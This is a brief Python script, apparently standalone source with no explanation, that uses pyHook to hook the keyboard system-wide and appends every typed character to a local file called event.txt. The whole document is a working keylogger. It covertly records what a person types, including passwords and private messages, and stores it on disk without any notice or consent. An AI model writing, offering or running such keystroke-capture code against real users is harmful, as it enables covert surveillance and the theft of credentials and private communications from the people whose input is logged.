import pyHook
import pythoncom

def OnKeyboardEvent(event):
	f = open("event.txt","a")
	f.write(str(chr(event.Ascii)))
	f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
